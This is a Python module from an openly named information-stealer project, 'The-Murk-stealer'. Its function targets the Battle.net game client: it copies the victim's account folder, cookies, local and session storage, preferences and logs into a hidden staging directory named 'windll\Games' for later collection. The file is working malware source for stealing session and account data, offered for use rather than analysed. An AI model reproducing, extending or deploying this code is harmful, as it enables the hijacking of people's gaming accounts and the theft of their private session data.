#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil

def BattleNet(data):
    pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
    if os.path.exists(f"{pathtofolder}\Battle.net\Account"):
        
        folders= [
            r'\Battle.net\Account',
            r'\Battle.net\BrowserCaches\common\Local Storage',
            r'\Battle.net\BrowserCaches\common\Session Storage',
            r'\Battle.net\Logs'
        ]
        files= [
            r'\Battle.net\BrowserCaches\LocalPrefs.json',
            r'\Battle.net\BrowserCaches\common\Cookies'
        ]
        os.makedirs(rf"{pathtofolder}\windll\Games\Battle.net")
        for folder in folders:
            try:
                shutil.copytree(f"{pathtofolder}{folder}",f"{pathtofolder}\windll\Games{folder}")
            except Exception as e:
                print(e)
        for file in files:
            try:
                shutil.copy2(f"{pathtofolder}{file}",f"{pathtofolder}\windll\Games{file}")
            except Exception as e:
                print(e)
        data.append("\n∟🎮Battle.net")
        return data
    else:
        return data